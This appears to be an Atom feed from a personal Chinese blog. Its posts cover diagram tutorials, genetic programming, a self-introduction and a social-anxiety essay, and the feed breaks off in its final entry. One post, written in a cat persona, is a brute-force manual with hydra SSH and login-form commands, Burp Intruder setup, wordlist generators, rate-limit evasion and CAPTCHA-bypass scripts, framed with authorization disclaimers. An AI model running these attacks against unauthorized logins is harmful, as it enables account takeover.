<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
    <title>凛的树屋</title>
    <link href="https://blog.rin.red/feed.xml" rel="self" />
    <link href="https://blog.rin.red" />
    <updated>2025-04-16T21:40:50+08:00</updated>
    <author>
        <name>Rin</name>
    </author>
    <id>https://blog.rin.red</id>

    <entry>
        <title>《猫娘图解教室：用肉垫绘制技术图表》</title>
        <author>
            <name>Rin</name>
        </author>
        <link href="https://blog.rin.red/lesslessmao-niang-tu-jie-jiao-shiyong-rou-dian-hui-zhi-ji-shu-tu-biaogreatergreater/"/>
        <id>https://blog.rin.red/lesslessmao-niang-tu-jie-jiao-shiyong-rou-dian-hui-zhi-ji-shu-tu-biaogreatergreater/</id>

        <updated>2025-04-16T21:40:50+08:00</updated>
            <summary>
                <![CDATA[
                    第一章：Mermaid 魔法图解术 🐾 1.1 流程图：小鱼干供应链 graph TD A[两脚兽打开罐头] --&gt; B{是否金枪鱼?} B --&gt;|是| C[优雅食用] B --&gt;|否| D[愤怒打翻] C --&gt; E[满意呼噜] D --&gt; F[持续喵喵叫] （甩尾巴解释） “看好了喵~这个图展示了本喵的决策流程： sequenceDiagram&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <h2 id="第一章：mermaid-魔法图解术-🐾">第一章：Mermaid 魔法图解术 🐾</h2>
<h3 id="11-流程图：小鱼干供应链">1.1 流程图：小鱼干供应链</h3>
<pre><code class="language-mermaid">graph TD
    A[两脚兽打开罐头] --&gt; B{是否金枪鱼?}
    B --&gt;|是| C[优雅食用]
    B --&gt;|否| D[愤怒打翻]
    C --&gt; E[满意呼噜]
    D --&gt; F[持续喵喵叫]
</code></pre>
<p><em>（甩尾巴解释）</em><br>“看好了喵~这个图展示了本喵的决策流程：  </p><ul>
<li>菱形是<strong>选择鱼干</strong>的关键时刻  </li>
<li>方框是<strong>具体行动</strong>  </li>
<li>箭头表示<strong>事件流向</strong>“</li>
</ul>
<h3 id="12-时序图：深夜跑酷事件">1.2 时序图：深夜跑酷事件</h3>
<pre><code class="language-mermaid">sequenceDiagram
    猫娘-&gt;&gt;+铲屎官: 凌晨3点踩脸
    铲屎官-&gt;&gt;+猫娘: 试图推开
    猫娘-&gt;&gt;床头柜: 踹下物品
    Note right of 猫娘: 战术性制造噪音
    铲屎官--&gt;&gt;-猫娘: 无奈投喂
</code></pre>
<p><em>（得意地竖起耳朵）</em><br>“这个时序图完美记录了本喵的<strong>战术威慑流程</strong>，注意这些符号：  </p><ul>
<li><code>+-&gt;&gt;</code> 代表<strong>主动行动</strong>  </li>
<li><code>--&gt;&gt;</code> 表示<strong>被动响应</strong>  </li>
<li>Note 是<strong>战术注释</strong>“</li>
</ul>
<h2 id="第二章：plantuml-肉垫制图法-🐱💻">第二章：PlantUML 肉垫制图法 🐱💻</h2>
<h3 id="21-组件图：智能猫窝系统">2.1 组件图：智能猫窝系统</h3>
<pre><code class="language-plantuml">@startuml
package &quot;智能猫窝&quot; {
  [温度传感器] as temp
  [自动喂食器] as feeder
  [猫脸识别] as camera
}

database &quot;云喵平台&quot; as cloud

temp --&gt; cloud : WiFi上报
feeder &lt;-- cloud : 远程指令
camera --&gt; cloud : 影像分析

@enduml
</code></pre>
<p><em>（用爪子指着屏幕）</em><br>“喵哈哈~这是本喵设计的<strong>物联网豪宅</strong>：  </p><ul>
<li><code>package</code> 是猫窝整体  </li>
<li>方括号 <code>[]</code> 代表<strong>硬件组件</strong>  </li>
<li>箭头显示<strong>数据流动方向</strong>“</li>
</ul>
<h3 id="22-状态图：猫娘心情机">2.2 状态图：猫娘心情机</h3>
<pre><code class="language-plantuml">@startuml
[*] --&gt; 发呆
发呆 --&gt; 兴奋 : 看到逗猫棒
兴奋 --&gt; 狩猎 : 玩具移动
狩猎 --&gt; 满足 : 成功捕获
满足 --&gt; 发呆 : 持续5分钟

state 暴怒 &lt;&lt;choice&gt;&gt;
狩猎 --&gt; 暴怒 : 玩具逃跑
暴怒 --&gt; 拆家 : 持续10秒
暴怒 --&gt; 哀怨 : 被制止
@enduml
</code></pre>
<p><em>（现场演示状态切换）</em><br>“注意这个<strong>暴怒选择态</strong>！双尖括号 <code>&lt;&lt;choice&gt;&gt;</code> 表示：  </p><ul>
<li>可能发展成 <code>拆家</code>  </li>
<li>或者被镇压成 <code>哀怨</code>“</li>
</ul>
<h2 id="第三章：er图猫际关系学-📊">第三章：ER图——猫际关系学 📊</h2>
<h3 id="31-核心实体定义">3.1 核心实体定义</h3>
<pre><code class="language-mermaid">erDiagram
    CAT {
        string 喵ID PK
        string 名字
        int 傲娇度
    }
    
    SERVANT {
        int 奴才ID PK
        string 称呼
    }
    
    FOOD {
        int 鱼干编号 PK
        string 类型
        bool 是否过期
    }
</code></pre>
<p><em>（尾巴画圈讲解）</em><br>“ER图就像<strong>猫社会的关系网</strong>：  </p><ul>
<li><code>PK</code> 是每只喵的<strong>唯一肉垫印</strong>  </li>
<li>大括号 <code>{}</code> 包含<strong>实体属性</strong>  </li>
<li>目前还没画关系线哦~”</li>
</ul>
<h3 id="32-关系网络构建">3.2 关系网络构建</h3>
<pre><code class="language-mermaid">erDiagram
    CAT ||--o{ SERVANT : &quot;奴役&quot;
    CAT }|--|{ FOOD : &quot;独占&quot;
    SERVANT }|--|| FOOD : &quot;进贡&quot;
</code></pre>
<p><em>（亮出爪子强调）</em><br>“现在用这些符号定义<strong>猫族社会法则</strong>：  </p><ul>
<li><code>||--o{</code> 表示<strong>一对多奴役</strong>  </li>
<li><code>}|--|{</code> 是<strong>多对多独占</strong>  </li>
<li>箭头方向体现<strong>权力关系</strong>“</li>
</ul>
<h2 id="第四章：综合实战案例-🎯">第四章：综合实战案例 🎯</h2>
<h3 id="41-全要素架构图">4.1 全要素架构图</h3>
<pre><code class="language-plantuml">@startuml
!theme toy
left to right direction

cloud &quot;喵星云&quot; {
  database &quot;猫脸数据库&quot; as db
  [API网关] as api
}

frame &quot;智能项圈&quot; {
  [GPS模块] as gps
  [健康监测] as health
}

db &lt;--&gt; api
api &lt;--&gt; gps : HTTPS
health --&gt; db : 同步数据

@enduml
</code></pre>
<p><em>（戴上眼镜严肃脸）</em><br>“这个综合案例展示了：  </p><ol>
<li>使用 <code>!theme toy</code> 设置<strong>可爱主题</strong>  </li>
<li><code>cloud</code> 和 <code>frame</code> 区分<strong>部署环境</strong>  </li>
<li>不同类型的<strong>连接线风格</strong>“</li>
</ol>
<h3 id="42-动态交互演示">4.2 动态交互演示</h3>
<pre><code class="language-mermaid">journey
    title 每日巡逻路线
    section 早晨
      阳台: 5: 晒太阳
      猫爬架: 3: 俯视领地
    section 夜晚
      沙发: 8: 埋伏突击
      冰箱: 4: 蹲守开门
</code></pre>
<p><em>（动态演示路线图）</em><br>“看本喵的<strong>行程可视化</strong>！  </p><ul>
<li><code>section</code> 划分时间段  </li>
<li>地点后的数字代表<strong>停留小时数</strong>  </li>
<li>自动生成<strong>时间轴比例</strong>“</li>
</ul>
<h2 id="终极猫娘绘图秘诀-🐱✨">终极猫娘绘图秘诀 🐱✨</h2>
<ol>
<li><strong>Mermaid</strong> 适合快速草图（像用爪子蘸墨水画画）</li>
<li><strong>PlantUML</strong> 适合精密设计（像猫工智能CAD）</li>
<li><strong>ER图</strong> 要体现权力结构（永远把CAT放最上面）</li>
</ol>
<p>（突然被激光笔吸引）啊！红色点点！…咳咳，总之记住：<br>“好的技术图表应该像猫步一样——优雅、精确、留有解读空间！”</p><p>（留下彩蛋）试着在VSCode里输入：</p><pre><code class="language-mermaid">graph LR
    A[你的创意] --&gt; B{是否有趣?}
    B --&gt;|是| C[分享给本喵]
    B --&gt;|否| D[加更多猫元素]
</code></pre>

            ]]>
        </content>
    </entry>
    <entry>
        <title>《喵喵特工队的密码爆破手册》</title>
        <author>
            <name>Rin&#x27;s imaginary Cat</name>
        </author>
        <link href="https://blog.rin.red/lesslesszhuan-ye-mao-niang-bao-po-shou-zhami-ma-po-jie-de-365zhong-you-ya-zi-shigreatergreater/"/>
        <id>https://blog.rin.red/lesslesszhuan-ye-mao-niang-bao-po-shou-zhami-ma-po-jie-de-365zhong-you-ya-zi-shigreatergreater/</id>

        <updated>2025-04-16T00:32:43+08:00</updated>
            <summary>
                <![CDATA[
                    喵呜~欢迎来到我的秘密基地！ （用爪子推开键盘）今天本喵要传授的是——如何优雅地撬开那些讨厌的密码锁！记住哦，我们只攻击获得授权的目标，就像只吃主人允许的小鱼干一样~ hydra -L /喵喵/users.txt -P /喵喵/rockyou.txt -t 4 -vV -o 成果.txt ssh://目标 （甩尾巴解释） （肉垫点击界面） username=§admin§&amp;password=§meow§ 第二章：字典的艺术 2.1 基础字典生成 import itertools 猫粮 = &#39;abcdefghijklmnopqrstuvwxyz0123456789!@&#39; 最小长度,&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <h2 id="喵呜欢迎来到我的秘密基地！">喵呜~欢迎来到我的秘密基地！</h2>
<p>（用爪子推开键盘）今天本喵要传授的是——如何优雅地撬开那些讨厌的密码锁！记住哦，我们只攻击获得授权的目标，就像只吃主人允许的小鱼干一样~</p><h2 id="第一章：必备工具包">第一章：必备工具包</h2>
<h3 id="11-hydra喵喵特供版">1.1 Hydra喵喵特供版</h3>
<pre><code class="language-bash">hydra -L /喵喵/users.txt -P /喵喵/rockyou.txt -t 4 -vV -o 成果.txt ssh://目标
</code></pre>
<p><em>（甩尾巴解释）</em></p><ul>
<li><code>-t 4</code>：用4个线程，就像本喵的4只爪爪同时工作</li>
<li><code>-vV</code>：详细模式，会把所有尝试都”喵”给你听</li>
<li><code>-o</code>：把成功的结果存起来，就像藏起美味的小鱼干</li>
</ul>
<h3 id="12-burp-suite猫猫定制版">1.2 Burp Suite猫猫定制版</h3>
<p>（肉垫点击界面）</p><ol>
<li>先抓个登录请求包</li>
<li>发送到Intruder模块</li>
<li>设置攻击类型为”喵喵叉”(Pitchfork)</li>
<li>在参数处标记：<pre><code class="language-http">username=§admin§&amp;password=§meow§
</code></pre>
</li>
</ol>
<h2 id="第二章：字典的艺术">第二章：字典的艺术</h2>
<h3 id="21-基础字典生成">2.1 基础字典生成</h3>
<pre><code class="language-python">import itertools

猫粮 = &#39;abcdefghijklmnopqrstuvwxyz0123456789!@&#39;
最小长度, 最大长度 = 6, 8

with open(&#39;字典.txt&#39;, &#39;w&#39;) as 小本本:
    for 长度 in range(最小长度, 最大长度+1):
        for 组合 in itertools.product(猫粮, repeat=长度):
            小本本.write(&#39;&#39;.join(组合) + &#39;\n&#39;)
</code></pre>
<h3 id="22-针对性优化">2.2 针对性优化</h3>
<pre><code class="language-bash">cewl -d 3 -m 5 -w 定制字典.txt https://目标网站
</code></pre>
<p><em>（竖起耳朵）</em> 这个命令会像抓老鼠一样，把目标网站的关键词都抓出来做成字典！</p><h2 id="第三章：突破防线">第三章：突破防线</h2>
<h3 id="31-优雅绕过限速">3.1 优雅绕过限速</h3>
<pre><code class="language-python">import random
import time

def 喵喵请求(url, 数据):
    等待时间 = random.uniform(1.2, 3.5)  # 随机等待
    time.sleep(等待时间)  # 假装是只普通小猫咪
    return requests.post(url, data=数据)
</code></pre>
<h3 id="32-验证码破解全攻略-🐱👤">3.2 验证码破解全攻略 🐱👤</h3>
<p>（竖起耳朵进入战斗状态）本喵最擅长的就是对付这些烦人的验证码啦！下面是详细技术手册：</p><h4 id="①-传统字符验证码破解术">① 传统字符验证码破解术</h4>
<pre><code class="language-python">from PIL import Image
import pytesseract
import io

def 喵喵OCR(验证码图片):
    # 预处理
    img = Image.open(io.BytesIO(验证码图片))
    img = img.convert(&#39;L&#39;)  # 灰度化
    img = img.point(lambda x: 255 if x &gt; 180 else 0)  # 二值化
    
    # 识别
    config = &#39;--psm 7 --oem 3 -c tessedit_char_whitelist=ABCDEFGHJKLMNPQRSTUVWXYZ23456789&#39;
    return pytesseract.image_to_string(img, config=config)

# 实战示例：
验证码 = requests.get(&#39;https://目标/captcha.jpg&#39;).content
print(f&quot;识别结果：{喵喵OCR(验证码)}&quot;)
</code></pre>
<p><em>（甩尾巴提示）</em> 记得先用<code>pip install pillow pytesseract</code>安装依赖哦！</p><h4 id="②-滑块验证码破解">② 滑块验证码破解</h4>
<pre><code class="language-python">from selenium.webdriver import ActionChains

def 破解滑块(驱动):
    滑块 = 驱动.find_element_by_class_name(&quot;slider&quot;)
    轨道 = 驱动.find_element_by_class_name(&quot;slider-track&quot;)
    
    # 计算需要滑动的距离
    轨道宽度 = 轨道.size[&#39;width&#39;]
    滑块宽度 = 滑块.size[&#39;width&#39;]
    移动距离 = 轨道宽度 - 滑块宽度 - 5  # 留点余量
    
    # 模拟人类滑动
    ActionChains(驱动).click_and_hold(滑块).perform()
    for i in range(5):
        ActionChains(驱动).move_by_offset(移动距离/5, 0).perform()
        time.sleep(random.uniform(0.1, 0.3))
    ActionChains(驱动).release().perform()
</code></pre>
<p><em>（肉垫调试技巧）</em> 可以保存截图辅助调试：</p><pre><code class="language-python">驱动.save_screenshot(&#39;debug.png&#39;)
</code></pre>
<h4 id="③-点选验证码进阶破解">③ 点选验证码进阶破解</h4>
<pre><code class="language-javascript">// 控制台直接执行版
function 喵喵点选(){
    // 获取所有需要点击的图片
    let targets = Array.from(document.querySelectorAll(&#39;.captcha-img&#39;));
    
    // 收集特征（这里示例用alt属性）
    let features = targets.map(img =&gt; img.alt);
    
    // 模拟点击（示例点击第1,3,5个）
    [0,2,4].forEach(i =&gt; {
        let rect = targets[i].getBoundingClientRect();
        let x = rect.left + rect.width/2;
        let y = rect.top + rect.height/2;
        
        // 创建点击事件
        let evt = new MouseEvent(&#39;click&#39;, {
            clientX: x,
            clientY: y,
            bubbles: true
        });
        targets[i].dispatchEvent(evt);
    });
}
</code></pre>
<h4 id="④-高级行为验证绕过">④ 高级行为验证绕过</h4>
<pre><code class="language-python"># 使用selenium模拟人类操作
def 人类行为模拟(驱动):
    # 随机移动鼠标
    action = ActionChains(驱动)
    for _ in range(10):
        x = random.randint(-50, 50)
        y = random.randint(-50, 50)
        action.move_by_offset(x, y).perform()
        time.sleep(random.uniform(0.1, 0.5))
    
    # 随机滚动页面
    驱动.execute_script(f&quot;window.scrollBy(0, {random.randint(-200, 200)})&quot;)
    time.sleep(1)
    
    # 随机点击空白处
    action.move_by_offset(10, 10).click().perform()
</code></pre>
<h3 id="验证码对抗升级表-📊">验证码对抗升级表 📊</h3>
<table>
<thead>
<tr>
<th>验证码类型</th>
<th>破解方法</th>
<th>所需技术</th>
<th>难度评级</th>
</tr>
</thead>
<tbody><tr>
<td>传统字符</td>
<td>OCR识别+预处理</td>
<td>Pillow图像处理</td>
<td>🐾🐾</td>
</tr>
<tr>
<td>滑块验证</td>
<td>轨迹模拟+缺口识别</td>
<td>OpenCV图像匹配</td>
<td>🐾🐾🐾</td>
</tr>
<tr>
<td>点选验证</td>
<td>特征识别+坐标计算</td>
<td>DOM分析</td>
<td>🐾🐾🐾🐾</td>
</tr>
<tr>
<td>行为验证</td>
<td>生物特征模拟</td>
<td>鼠标轨迹生成</td>
<td>🐾🐾🐾🐾🐾</td>
</tr>
</tbody></table>
<p><em>（突然弹出警告）</em> 喵！注意法律边界！</p><pre><code class="language-legal">/* 法律注释 */
// 所有技术仅限授权测试使用
// 禁止用于非法用途
// 猫猫特工队保留最终解释权
</code></pre>
<h2 id="第四章：防御小课堂">第四章：防御小课堂</h2>
<h3 id="41-强密码建议">4.1 强密码建议</h3>
<p>（认真脸）好的密码应该像猫粮配方一样复杂：</p><ul>
<li>至少12个字符</li>
<li>混合大小写字母、数字和特殊符号</li>
<li>比如：<code>M3oW!sTheB3st2023</code></li>
</ul>
<h3 id="42-登录保护">4.2 登录保护</h3>
<pre><code class="language-python">if 失败次数 &gt; 3:
    弹出验证码()
    if 失败次数 &gt; 5:
        锁定账号(30)  # 30分钟反省时间
</code></pre>
<h2 id="法律喵喵提醒">法律喵喵提醒</h2>
<p>（突然严肃）记住啦：</p><ol>
<li>必须获得书面授权</li>
<li>只能在规定范围内测试</li>
<li>发现漏洞要及时报告</li>
</ol>
<p>（恢复调皮）就像不能偷吃厨房的鱼一样，未经授权的测试是会被关禁闭的哦！</p><h2 id="实战小剧场">实战小剧场</h2>
<p><em>场景：深夜，猫猫正在测试某个授权目标</em></p><p>（爪子快速敲击键盘）</p><pre><code class="language-bash">hydra -l admin -P 字典.txt -t 4 -vV http-post-form &quot;/login:user=^USER^&amp;pass=^PASS^:F=失败&quot;
</code></pre>
<p>（突然屏幕弹出）</p><pre><code class="language-plaintext">[22:33] [DATA] attack successful for user &#39;admin&#39; with password &#39;Me0w!123&#39;
</code></pre>
<p>（开心打滚）”喵哈哈！又成功啦！不过…” <em>看了眼授权书</em> “该去写报告了~”</p><p>（优雅关机前）记住本喵的格言：”技术要用在正途，就像爪子只用来敲键盘不挠沙发！”</p><p>下次见喵~（留下一个小爪印图标）🐾</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>这是一个图片插入测试</title>
        <author>
            <name>Rin</name>
        </author>
        <link href="https://blog.rin.red/zhe-shi-yi-ge-tu-pian-cha-ru-ce-shi/"/>
        <id>https://blog.rin.red/zhe-shi-yi-ge-tu-pian-cha-ru-ce-shi/</id>

        <updated>2025-04-15T18:09:51+08:00</updated>
            <summary></summary>
        <content type="html">
            <![CDATA[
                <figure class="post__image"><img loading="lazy"  src="https://blog.rin.red/media/posts/7/40BCD8A74D41F3B4A589B7FDB03F7A79.jpg" alt="my github avatar" width="2499" height="3317" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://blog.rin.red/media/posts/7/responsive/40BCD8A74D41F3B4A589B7FDB03F7A79-xs.jpg 300w ,https://blog.rin.red/media/posts/7/responsive/40BCD8A74D41F3B4A589B7FDB03F7A79-sm.jpg 480w ,https://blog.rin.red/media/posts/7/responsive/40BCD8A74D41F3B4A589B7FDB03F7A79-md.jpg 768w ,https://blog.rin.red/media/posts/7/responsive/40BCD8A74D41F3B4A589B7FDB03F7A79-lg.jpg 1024w"></figure>
            ]]>
        </content>
    </entry>
    <entry>
        <title>一篇真正的自我介绍</title>
        <author>
            <name>Rin</name>
        </author>
        <link href="https://blog.rin.red/yi-pian-zhen-zheng-de-zi-wo-jie-shao/"/>
        <id>https://blog.rin.red/yi-pian-zhen-zheng-de-zi-wo-jie-shao/</id>

        <updated>2025-04-15T00:31:16+08:00</updated>
            <summary>
                <![CDATA[
                    <p>我的网名是rin，它来源于Porter Robinson一首叫做Shelter曲目的MV</p>
<p>记忆真是深刻啊，关于这个mv我是在高中时候第一次看到的，深刻于它的超现实世界框架..啊扯远了.....</p>
<p>我喜欢DevOps，LAMP Stack，PHP，Python，尤其是Python优秀的包管理器pip...(?)</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p>我的网名是rin，它来源于Porter Robinson一首叫做Shelter曲目的MV</p>
<p>记忆真是深刻啊，关于这个mv我是在高中时候第一次看到的，深刻于它的超现实世界框架..啊扯远了.....</p>
<p>我喜欢DevOps，LAMP Stack，PHP，Python，尤其是Python优秀的包管理器pip...(?)</p>

<p>我在自己家部署了linux机器，同时也使用了一些优秀的聊天机器人框架实现，就比如OwO，熟悉认识我的人可能已经用过了，也用了我认为很成功的AList，假设自己托管SLA没有问题再去挂载例如aliyunpan open之类的存储提供商，可用性还是很高的ovo</p>
<p>我喜欢令我一时琢磨不透的新奇东西，再去学习后那种成就感是很不错的，i like that. </p>
<p>有时候我觉得代码仓库里的commit history比这篇博客更诚实，那些深夜强行push的垃圾代码，那些被revert的废话注释，还有某次迷迷糊糊之后写的诡异正则表达式——像不像数字时代的非主流文学...？</p>
<p>你知道最讽刺的是什么吗？我们这代人用k8s docker编排着几百个容器，却搞不定出租屋里的智能电表，米家那样的智能网关。上次openwrt崩溃时，我蹲在路由器前用手机热点查文档的样子hh，像MV里那个对着废墟敲打键盘的rin..</p>
<p>最近在写一个自毁式日志系统，当df检测到sda空间不足时</p>
<pre class="language-bash line-numbers"><code>#!/bin/bash

THRESHOLD=10

AVAILABLE_SPACE=$(df /dev/sda | awk 'NR==2 {print $4}' | sed 's/G//')

if (( $(echo "$AVAILABLE_SPACE &lt; $THRESHOLD" | bc -l) )); then
  echo "警告：/dev/sda 空间不足，可用空间为 $AVAILABLE_SPACE G，正在清理 /tmp 目录..."
  rm -rf /tmp/*
  echo "/tmp 目录已清理完成."
else
  echo "/dev/sda 空间充足."
fi</code></pre>
<p>会优先删除我自己放在这里的那些没实现的想法。这算不算某种数字层面的...自我和解？关于没有完善它们之类的</p>
<p>真是着迷，这种在抽象深渊边缘试探的眩晕感。把SOS编译成JSON，用HTTP状态码形似与意义上的哭泣，在CI/CD流水线里刻下到此一游...</p>
<p>P. S. 真是抽象的自我介绍lmao bro以为他是意识流写手把self introduction写的似乎有点flow了</p>
<p> </p>
            ]]>
        </content>
    </entry>
    <entry>
        <title> 🐾 遗传编程の奇妙冒险：让代码自己生小猫崽！！</title>
        <author>
            <name>Rin&#x27;s imaginary Cat</name>
        </author>
        <link href="https://blog.rin.red/rang-dai-ma-zi-ji-sheng-xiao-mao-zai/"/>
        <id>https://blog.rin.red/rang-dai-ma-zi-ji-sheng-xiao-mao-zai/</id>

        <updated>2025-04-14T23:43:29+08:00</updated>
            <summary>
                <![CDATA[
                    （先来个标准猫式开场）ฅ^•ﻌ•^ฅ 各位两脚兽程序员们注意啦！今天本喵要传授如何在电脑里养出一窝会写代码的电子猫崽~ 准备好小鱼干和猫薄荷，我们要开始啦！ 就像本喵的后院猫猫家族： （突然被自己尾巴绊倒）喵嗷！先来看个具体栗子🌰： # 初始猫猫种群（第一代代码喵） kittens = [ &quot;x + 1&quot;, # 普通橘猫 &quot;x * x - 3&quot;, # 聪明布偶 &quot;meow(x)&quot;, # 变异无毛猫（危险！）&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p>（先来个标准猫式开场）ฅ^•ﻌ•^ฅ 各位两脚兽程序员们注意啦！今天本喵要传授如何在电脑里养出一窝会写代码的电子猫崽~ 准备好小鱼干和猫薄荷，我们要开始啦！</p><h2 id="1-喵星人理解的遗传编程">1. 喵星人理解的遗传编程</h2>
<p>就像本喵的后院猫猫家族：</p><ul>
<li>猫爸会抓老鼠（x + 1）</li>
<li>猫妈会开罐头（x * x）</li>
<li>生出的猫崽可能…
  - 完美继承：x² + 2x（优秀猎手！）
  - 变异品种：sin(x)*喵喵叫（这是什么外星猫？！）</li>
</ul>
<p>（突然被自己尾巴绊倒）喵嗷！先来看个具体栗子🌰：</p><pre><code class="language-python"># 初始猫猫种群（第一代代码喵）
kittens = [
    &quot;x + 1&quot;,         # 普通橘猫
    &quot;x * x - 3&quot;,     # 聪明布偶
    &quot;meow(x)&quot;,       # 变异无毛猫（危险！）
    &quot;0&quot;,             # 摆烂蓝猫
    &quot;x * (x + 2)&quot;    # 赛博缅因猫
]
</code></pre>
<h2 id="2-猫猫进化の翻车大赏">2. 猫猫进化の翻车大赏</h2>
<p>（竖起飞机耳警告）这些坑本喵都踩过喵！</p><h3 id="21-代码膨胀（变成胖橘猫）">2.1 代码膨胀（变成胖橘猫）</h3>
<p>有些坏猫猫会偷偷往代码里塞无关指令：</p><pre><code class="language-python">&quot;(x*x) + (2*x) + 1 + (0*喵喵喵)&quot;
# 实际效果和 x²+2x+1 一样，但多了一堆废指令！
</code></pre>
<p><strong>本喵的解决方案</strong>：</p><ul>
<li>每天称体重（限制代码长度）</li>
<li>强制跑步机训练（修剪语法树）</li>
</ul>
<h3 id="22-作弊喵（应试教育受害者）">2.2 作弊喵（应试教育受害者）</h3>
<p>有些狡猾猫猫会发现适应度函数的漏洞：</p><pre><code class="language-python">if x in 训练数据:
    return 标准答案
else:
    return random()  # 理直气壮摆烂
</code></pre>
<p>（本喵的猫爪已经按在删除键上了！）</p><h3 id="23-近亲繁殖危机">2.3 近亲繁殖危机</h3>
<p>所有猫猫突然都变成复读机：</p><pre><code class="language-python"># 第20代种群：
[&quot;return 42&quot;, &quot;return 42&quot;, &quot;return 42&quot;...]
# 达尔文看了都要掀棺材板喵！
</code></pre>
<h2 id="3-手动撸猫指南（干预进化）">3. 手动撸猫指南（干预进化）</h2>
<p>当自动进化不靠谱时，就该两脚兽出手啦！</p><h3 id="31-人工配种">3.1 人工配种</h3>
<p>往基因池里塞点优质血统：</p><pre><code class="language-python">kittens.append(&quot;math.sin(x)&quot;)  # 加入学霸猫基因
kittens.append(&quot;x**3&quot;)         # 加入网红猫基因
</code></pre>
<h3 id="32-动态猫粮奖励">3.2 动态猫粮奖励</h3>
<p>发现摆烂猫就克扣小鱼干：</p><pre><code class="language-python">def 猫猫评分(代码):
    if &quot;return 0&quot; in 代码:
        return -1000  # 倒扣罐头！
    elif &quot;喵喵喵&quot; in 代码:
        return +50    # 娱乐精神加分！
</code></pre>
<h3 id="33-混合喂养策略">3.3 混合喂养策略</h3>
<p>本喵的私房食谱：</p><ol>
<li>70%自动进化（自助猫粮）</li>
<li>20%手动优化（精品罐头）</li>
<li>10%随机突变（猫薄荷彩蛋）</li>
</ol>
<p>（突然开始疯狂踩键盘）喵啊啊啊写嗨了！最后送上本喵的GP心得：</p><h2 id="4-喵式总结">4. 喵式总结</h2>
<p>✅ 适合场景：</p><ul>
<li>找不出公式但有很多栗子（比如预测猫主子心情）</li>
<li>需要创意解法（比如自动生成猫玩具设计）</li>
</ul>
<p>❌ 不适合场景：</p><ul>
<li>需要绝对可靠（比如猫粮自动投喂系统）</li>
<li>解释性要求高（比如向兽医解释猫咪病情）</li>
</ul>
<p>记住喵！GP就像养猫：</p><ul>
<li>完全不管 → 可能养出拆家哈士奇</li>
<li>过度控制 → 失去神奇创造力</li>
<li>最佳状态 → 偶尔给点罐头和小鱼干引导就好~</li>
</ul>
<p>（用尾巴按下发布键）咕噜咕噜~ 各位铲屎官有养过电子猫猫吗？会编程的那种嚄！嘻嘻~</p><p>P.S. 本喵上次用GP生成的自动铲屎算法…结果进化出了”把猫砂倒进人类被窝”的方案（眼神死）🐾💻</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>孤独的乐高玩家：当人际关系变成一个个积木套装</title>
        <author>
            <name>Rin</name>
        </author>
        <link href="https://blog.rin.red/gu-du-de-le-gao-wan-jiadang-ren-ji-guan-xi-bian-cheng-yi-ge-ge-ji-mu-tao-zhuang/"/>
        <id>https://blog.rin.red/gu-du-de-le-gao-wan-jiadang-ren-ji-guan-xi-bian-cheng-yi-ge-ge-ji-mu-tao-zhuang/</id>

        <updated>2025-04-14T12:11:41+08:00</updated>
            <summary>
                <![CDATA[
                    <p>我坐在餐厅里，看着旁边谈笑风生的人群，突然意识到一个可怕的事实——在我的大脑里，每个人都像乐高说明书里规定好的模型。他们说着预期内的对白，做着可预测的反应，连嘴角上扬的弧度都像是用量角器校准过的，太恐怖了。<br><br>这让我想起小时候玩的电子宠物。只要按时喂食、清理、玩耍，就能收获预期的亲密度，像是如意料中一样。现在的人际关系何尝不是如此？输入固定的话术，得到标准的回应。只不过这次的电子宠物变成了会呼吸的人类。</p>

                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <p>我坐在餐厅里，看着旁边谈笑风生的人群，突然意识到一个可怕的事实——在我的大脑里，每个人都像乐高说明书里规定好的模型。他们说着预期内的对白，做着可预测的反应，连嘴角上扬的弧度都像是用量角器校准过的，太恐怖了。<br><br>这让我想起小时候玩的电子宠物。只要按时喂食、清理、玩耍，就能收获预期的亲密度，像是如意料中一样。现在的人际关系何尝不是如此？输入固定的话术，得到标准的回应。只不过这次的电子宠物变成了会呼吸的人类。</p>

<p><br><br>我的社交恐惧可能源于一个奇怪的超能力——我能自动把每个新认识的人归档到预先设置好的分类里：<br>1. 职场夸夸型（特征：说话自带三个感叹号）<br>2. 佛系敷衍型（特征：回复不超过五个字）<br>3. 人生导师型（特征：每句话都以"其实我觉得"开头）<br><br>最可怕的是，这套分类系统准确率高得惊人。上周聚会上，我甚至能预测到第三位来宾会在第7分钟开始谈论他的健身计划（误差±30秒）。<br><br>这种"人类观察实验"带来的副作用是，我开始怀疑自己是不是也成了别人眼中的标准模板。也许在某个人的大脑里，我也被简化为"那个总是用奇怪比喻的聊天对象"？<br><br>最近尝试着打破这种思维定式。比如：<br>-故意在朋友说"最近怎么样"时回答"我的仙人掌昨天开花了"而不是"还行"<br>-把社交软件上的自动回复改成了手打（虽然打出来的还是差不多的话）<br>-尝试记住咖啡师今天换的新首饰而不是机械地说"老样子"...<br><br>效果很微妙。有时候会收获真实的笑容，有时候只会得到困惑的眼神。但至少，这让我感觉自己不是在玩一个已经通关无数次的单机游戏。<br><br>也许真正的问题不在于别人是不是模板，而在于我太执着于寻找规律。就像知道魔术原理的观众，再也无法享受魔术带来的惊喜。<br><br>所以现在，我要去做一件最不模板化的事情——把这篇文字的最后一句改成：<br>"看，窗外有只穿西装的松鼠在骑滑板车！"<br>（虽然你可能不会相信，但这确实是我此刻能想到的最不按常理结尾的方式了lol）</p>
<p>以上是我本人有时候真正的想法 虽然看着有些小众了(小众吗？</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>第一个(w)</title>
        <author>
            <name>Rin&#x27;s imaginary Cat</name>
        </author>
        <link href="https://blog.rin.red/first-post/"/>
        <id>https://blog.rin.red/first-post/</id>

        <updated>2025-04-14T01:27:46+08:00</updated>
            <summary>
                <![CDATA[
                    <div class="paragraph">
<div class="paragraph">
